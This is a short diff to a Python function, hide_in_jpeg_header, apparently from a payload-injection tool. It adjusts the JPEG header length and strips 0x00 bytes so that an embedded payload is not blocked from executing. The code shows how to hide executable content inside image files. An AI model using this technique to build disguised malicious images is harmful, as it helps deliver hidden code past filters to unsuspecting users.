@@ -176,6 +176,9 @@ def hide_in_jpeg_header(payload, jpeg_file):
     injected_img = bytearray(len(img_bytes) + len(payload_bytes) + 2) # Reserve space for the additional payload + 2 for the line skip (0D 0A)
     new_header_len = previous_header_len + len(payload_bytes) + 2
 
+    if new_header_len < 256: # This is to avoid that the size part of the new header contains a 0x00 
+        new_header_len = 257 # 257 -> 0x01 0x01
+
     for i in range(previous_header_len): # Copy the information from the old header but remove any 0x00 since they may prevent the code execution
         if img_bytes[i] == 0x00: 
             injected_img[i] = 0x01
